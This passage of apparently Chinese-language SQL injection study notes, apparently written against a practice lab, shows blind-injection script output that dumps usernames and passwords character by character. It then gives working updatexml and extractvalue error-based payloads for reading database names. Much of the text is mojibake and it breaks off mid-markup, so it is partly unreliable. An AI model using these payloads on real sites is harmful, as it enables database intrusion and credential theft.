ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: p<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: pa<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: pas<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: pass<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: passw<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: passwo<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: passwor<br>[+] è·å–ç¬¬ 8 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: password<br>[+] å­—æ®µå: password<br>[+] è·å–usersè¡¨çš„æ•°æ®â€¦<br>[+] è·å–å­—æ®µ: username<br>[+] æ•°æ®æ¡æ•°: 13<br>[+] é•¿åº¦ä¸º: 4<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: d<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: du<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dum<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dumb<br>[+] æ•°æ®[1]: dumb<br>[+] é•¿åº¦ä¸º: 8<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: an<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ang<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ange<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: angel<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: angeli<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: angelin<br>[+] è·å–ç¬¬ 8 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: angelina<br>[+] æ•°æ®[2]: angelina<br>[+] é•¿åº¦ä¸º: 5<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: d<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: du<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dum<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dumm<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dummy<br>[+] æ•°æ®[3]: dummy<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: s<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: se<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: sec<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: secu<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: secur<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: secure<br>[+] æ•°æ®[4]: secure<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: s<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: st<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stu<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stup<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stupi<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stupid<br>[+] æ•°æ®[5]: stupid<br>[+] é•¿åº¦ä¸º: 8<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: s<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: su<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: sup<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: supe<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: super<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: superm<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: superma<br>[+] è·å–ç¬¬ 8 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: superman<br>[+] æ•°æ®[6]: superman<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: b<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ba<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: bat<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: batm<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: batma<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: batman<br>[+] æ•°æ®[7]: batman<br>[+] é•¿åº¦ä¸º: 5<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] æ•°æ®[8]: admin<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin1<br>[+] æ•°æ®[9]: admin1<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin2<br>[+] æ•°æ®[10]: admin2<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin3<br>[+] æ•°æ®[11]: admin3<br>[+] é•¿åº¦ä¸º: 7<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: d<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dh<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dha<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dhak<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dhakk<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dhakka<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dhakkan<br>[+] æ•°æ®[12]: dhakkan<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin4<br>[+] æ•°æ®[13]: admin4<br>[+] è·å–å­—æ®µ: password<br>[+] æ•°æ®æ¡æ•°: 13<br>[+] é•¿åº¦ä¸º: 4<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: d<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: du<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dum<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dumb<br>[+] æ•°æ®[1]: dumb<br>[+] é•¿åº¦ä¸º: 10<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i-<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i-k<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i-ki<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i-kil<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i-kill<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i-kill-<br>[+] è·å–ç¬¬ 8 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i-kill-y<br>[+] è·å–ç¬¬ 9 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i-kill-yo<br>[+] è·å–ç¬¬ 10 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: i-kill-you<br>[+] æ•°æ®[2]: i-kill-you<br>[+] é•¿åº¦ä¸º: 8<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: p<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: p@<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: p@s<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: p@ss<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: p@ssw<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: p@sswo<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: p@sswor<br>[+] è·å–ç¬¬ 8 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: p@ssword<br>[+] æ•°æ®[3]: p@ssword<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: c<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: cr<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: cra<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: crap<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: crapp<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: crappy<br>[+] æ•°æ®[4]: crappy<br>[+] é•¿åº¦ä¸º: 9<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: s<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: st<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stu<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stup<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stupi<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stupid<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stupidi<br>[+] è·å–ç¬¬ 8 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stupidit<br>[+] è·å–ç¬¬ 9 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: stupidity<br>[+] æ•°æ®[5]: stupidity<br>[+] é•¿åº¦ä¸º: 7<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: g<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ge<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: gen<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: geni<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: genio<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: geniou<br>[+] è·å–ç¬¬ 7 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: genious<br>[+] æ•°æ®[6]: genious<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: m<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: mo<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: mob<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: mob!<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: mob!l<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: mob!le<br>[+] æ•°æ®[7]: mob!le<br>[+] é•¿åº¦ä¸º: 5<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] æ•°æ®[8]: admin<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin1<br>[+] æ•°æ®[9]: admin1<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin2<br>[+] æ•°æ®[10]: admin2<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin3<br>[+] æ•°æ®[11]: admin3<br>[+] é•¿åº¦ä¸º: 5<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: d<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: du<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dum<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dumb<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: dumbo<br>[+] æ•°æ®[12]: dumbo<br>[+] é•¿åº¦ä¸º: 6<br>[+] è·å–ç¬¬ 1 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: a<br>[+] è·å–ç¬¬ 2 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: ad<br>[+] è·å–ç¬¬ 3 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: adm<br>[+] è·å–ç¬¬ 4 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admi<br>[+] è·å–ç¬¬ 5 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin<br>[+] è·å–ç¬¬ 6 ä¸ªå­—ç¬¦â€¦<br>[+] å½“å‰ç»“æœ: admin4<br>[+] æ•°æ®[13]: admin4</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">### bpç›²æ³¨çˆ†ç ´<br>csdnä¸Šçœ‹åˆ°å¯ä»¥ç›´æ¥ä¸ç”¨å†™è„šæœ¬ç›´æ¥ç”¨bpçœ‹è¿”å›é•¿åº¦æ¥çˆ†ç ´çš„  <br>çœ‹æ¥ä¹Ÿå¯ä»¥ä¸ç”¨<span class="hljs-keyword">if</span>å‡½æ•°æ¥æ„é€ payload<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™and substr(database(),1,1) &#x3D;â€™sâ€™â€“+</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">èƒ½è¾¾åˆ°åŒæ ·æ•ˆæœ<br><br>bpçˆ†ç ´çš„è¯payloadè®¾ç½®çš„å‰åå’Œå¾ªåºæœ‰ç‚¹éš¾æï¼Œä½†æ˜¯åŸç†çŸ¥é“äº†å¯ä»¥ä¸€æ¬¡ä¸€æ¬¡æ…¢æ…¢è¯•ï¼›<br><br>## <span class="hljs-type">xml</span>æŠ¥é”™æ³¨å…¥<br><br>å‰ææ˜¯åœ¨æœ‰<span class="hljs-keyword">sql</span>æŠ¥é”™ä¿¡æ¯è¾“å‡ºçš„å‰æä¸‹ï¼ˆå­˜åœ¨print_r(mysql_error())å‡½æ•°ï¼‰<br><br>åœ¨é«˜ç‰ˆæœ¬MySQLï¼ˆ<span class="hljs-number">5.1</span>ï¼‰ä¸­æ·»åŠ äº†å¯¹<span class="hljs-type">xml</span>æ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°<br><br><span class="hljs-keyword">update</span>å‡½æ•°ï¼š<br></code></pre></td></tr></table></figure>
<p>UPDATEXML(xml_target, xpath_expr, new_xml)</p>
<p>xml_targetï¼šè¦æ›´æ–°çš„XMLæ–‡æ¡£ã€‚<br>xpath_exprï¼šXPathè¡¨è¾¾å¼ï¼Œç”¨äºå®šä½éœ€è¦æ›´æ–°çš„èŠ‚ç‚¹ã€‚<br>new_xmlï¼šæ–°çš„XMLç‰‡æ®µæˆ–å€¼ï¼Œç”¨äºæ›¿æ¢ç›®æ ‡èŠ‚ç‚¹çš„å€¼ã€‚</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">extractvalue</span>å‡½æ•°ï¼š<br></code></pre></td></tr></table></figure>
<p>EXTRACTVALUE(xml_target, xpath_expr)</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">åŸç†æ˜¯ç”¨<span class="hljs-keyword">xpath</span>çš„éæ³•å­—ç¬¦æŠ¥é”™<br>KIMIï¼š<br>&gt;updatexml()å’Œextractvalue()å‡½æ•°åœ¨å¤„ç†XMLæ•°æ®æ—¶ï¼Œä¼šä½¿ç”¨<span class="hljs-keyword">XPath</span>è¡¨è¾¾å¼æ¥å®šä½æˆ–æå–èŠ‚ç‚¹ã€‚å¦‚æœ<span class="hljs-keyword">XPath</span>è¡¨è¾¾å¼ä¸ç¬¦åˆè¯­æ³•è§„èŒƒï¼ŒMySQLä¼šè¿”å›é”™è¯¯ä¿¡æ¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§ï¼Œé€šè¿‡æ‹¼æ¥æ¶æ„çš„<span class="hljs-keyword">XPath</span>è¡¨è¾¾å¼ï¼Œä½¿æ•°æ®åº“æŠ¥é”™ï¼Œå¹¶åœ¨é”™è¯¯ä¿¡æ¯ä¸­æ³„éœ²æ•æ„Ÿæ•°æ®ã€‚  <br><br>æµç¨‹ï¼š  <br><br><span class="hljs-number">1</span>.åˆ¤æ–­é—­åˆç‚¹  <br><span class="hljs-number">2</span>.åˆ¤æ–­æ˜¯å¦å­˜åœ¨xmlæŠ¥é”™æ³¨å…¥ï¼š  <br>ä½¿ç”¨**updatexml**<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™ and updatexml(1,0x7e,1) â€“+<br>0x7e æ˜¯ ~ çš„16è¿›åˆ¶è¡¨ç¤ºï¼Œç”¨æ¥è¿›è¡Œç»•è¿‡ï¼Œå­—ç¬¦ä¸²æ›¿æ¢æˆåå…­è¿›åˆ¶æ•°æœ‰ä¸€å®šçš„ç»•è¿‡ä½œç”¨</p>
<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">æˆåŠŸå›æ˜¾<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-variable constant_">XPATH</span> syntax <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;~&#x27;</span>  </span><br><br>è¯´æ˜å­˜åœ¨æŠ¥é”™æ³¨å…¥<br><br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1â€™ and updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1) â€“+</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&gt;çˆ†åº“å<br><br><span class="hljs-strong">***note**</span>* <br><br>concatå’Œgroup<span class="hljs-emphasis">_concatæœ‰ä»€ä¹ˆåŒºåˆ«,é—®äº†kimiï¼Œ  </span><br><span class="hljs-emphasis">***æˆ‘æ€»ç»“å°±æ˜¯concatç”¨æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œgroup_</span>concatç”¨æ¥æ‹¼æ¥è¡¨ä¸­çš„å†…å®¹<span 